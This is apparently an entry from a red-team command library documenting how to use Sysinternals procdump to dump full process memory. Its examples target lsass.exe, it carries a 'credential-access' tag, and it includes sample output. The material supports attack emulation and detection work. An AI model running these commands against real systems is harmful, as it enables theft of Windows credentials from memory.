---
id: a9087a04-b1d0-4765-beeb-d8ffbc3fef5e
name: procdump-dump-process-memory
type: command
executor: command_prompt
data: procdump.exe -ma $_PID $_OUTPUT.dmp
output: |-
  C:\Users\Bob\Desktop>procdump.exe -ma 2416 output-2416.dmp

  ProcDump v9.0 - Sysinternals process dump utility
  Copyright (C) 2009-2017 Mark Russinovich and Andrew Richards
  Sysinternals - www.sysinternals.com

  [10:44:10] Dump 1 initiated: C:\Users\Bob\Desktop\output-2416.dmp
  [10:44:10] Dump 1 writing: Estimated dump file size is 519 MB.
  [10:44:17] Dump 1 complete: 519 MB written in 7.1 seconds
  [10:44:17] Dump count reached.
created_at: '2020-01-02T18:45:14.101098+00:00'
updated_at: '2023-05-29T16:48:52.884824+00:00'
platforms:
  - Windows
tags:
  - memory-dump
  - credential-access
verified: true
validated: true
---

# procdump-dump-process-memory

## Command

```command_prompt
procdump.exe -ma $_PID $_OUTPUT.dmp
```

## Description

Dumps the full memory of a specified process using Procdump, creating a .dmp file for offline analysis of in-memory artifacts like passwords.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| -ma | Dump full memory (all accessible memory) | Yes |
| $_PID | Process ID to dump | Yes |
| $_OUTPUT.dmp | Output filename for the dump | Yes |

## Examples

### Basic Usage

```command_prompt
procdump.exe -ma 1234 lsass.dmp
```

### Advanced Usage

```command_prompt
procdump.exe -ma lsass.exe -o lsass-%t.dmp
```

## Expected Output

Progress messages including dump initiation, estimated size, and completion status, with the .dmp file created.

## Related

- [[procedures/Dump-Process-Memory-Using-Procdump]]
